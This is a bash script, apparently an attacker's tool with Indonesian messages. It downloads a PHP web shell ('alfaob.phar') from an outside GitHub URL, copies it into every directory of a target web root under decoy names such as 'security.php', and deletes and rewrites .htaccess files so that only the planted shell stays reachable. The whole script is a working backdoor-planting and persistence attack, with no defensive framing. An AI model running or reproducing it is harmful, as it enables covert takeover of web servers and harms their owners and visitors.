#!/bin/bash

if [ -z "$1" ]; then
  echo "Penggunaan: bash ht.sh /path/to/directory"
  exit 1
fi

TARGET_DIR="$1"
PHP_URL="https://raw.githubusercontent.com/paylar/shell/main/alfaob.phar"

PHP_FILES=(
  "autoload.php" "constants.php" "settings.php" "middleware.php" "dispatcher.php" 
  "response.php" "request.php" "router-config.php" "bootstrap.php" "model.php" 
  "view.php" "template.php" "cache.php" "logger.php" "error-handler.php" 
  "validator.php" "security.php" "firewall.php" "backup.php" "db-migrate.php" 
  "migration.php" "seed.php" "database-seeder.php" "queue-worker.php" "mail-handler.php" 
  "notification.php" "message-broker.php" "event-listener.php" "event-dispatcher.php" "command-runner.php" 
  "worker.php" "job-handler.php" "scheduler.php" "task-runner.php" "queue.php" 
  "file-uploader.php" "image-processor.php" "image-resizer.php" "pdf-generator.php" "report-generator.php" 
  "payment-handler.php" "checkout.php" "cart-manager.php" "order-manager.php" "invoice.php" 
  "customer-service.php" "support.php" "ticket-system.php" "user-profile1.php" "account-settings.php"
)

if ! command -v curl &> /dev/null; then
    echo "curl tidak ditemukan, silakan install curl terlebih dahulu."
    exit 1
fi

find "$TARGET_DIR" -type f -name ".htaccess" -exec rm -f {} +

TMP_PHAR=$(mktemp)
curl -s -o "$TMP_PHAR" "$PHP_URL"
if [ $? -ne 0 ] || [ ! -f "$TMP_PHAR" ]; then
    echo "Gagal mendownload file alfaob.phar"
    exit 1
fi

find "$TARGET_DIR" -type d -print0 | while IFS= read -r -d '' DIR; do
    SELECTED_PHP_FILE="${PHP_FILES[$RANDOM % ${#PHP_FILES[@]}]}"

    cp "$TMP_PHAR" "$DIR/$SELECTED_PHP_FILE"
    if [ $? -ne 0 ] || [ ! -f "$DIR/$SELECTED_PHP_FILE" ]; then
        echo "Gagal menyalin $SELECTED_PHP_FILE ke $DIR"
        continue
    fi

    chmod 644 "$DIR/$SELECTED_PHP_FILE"

    HTACCESS_CONTENT="<FilesMatch \"\\.(ph.*|a.*|P[hH].*|S.*)$\">
        Require all denied
    </FilesMatch>

    <FilesMatch \"\\.(jpg|jpeg|pdf|docx)$\">
        Require all granted
    </FilesMatch>

    <FilesMatch \"^(index\\.html|index-MAR\\.php|${SELECTED_PHP_FILE})$\">
        Require all granted
    </FilesMatch>

    DirectoryIndex index.html
    Options -Indexes

    ErrorDocument 403 \"403 Forbidden\"
    ErrorDocument 404 \"404 Not Found\"
    "
    EOF

    echo "$HTACCESS_CONTENT" > "$DIR/.htaccess"
    if [ $? -ne 0 ]; then
        echo "Gagal menulis .htaccess di $DIR"
    fi
done

rm -f "$TMP_PHAR"
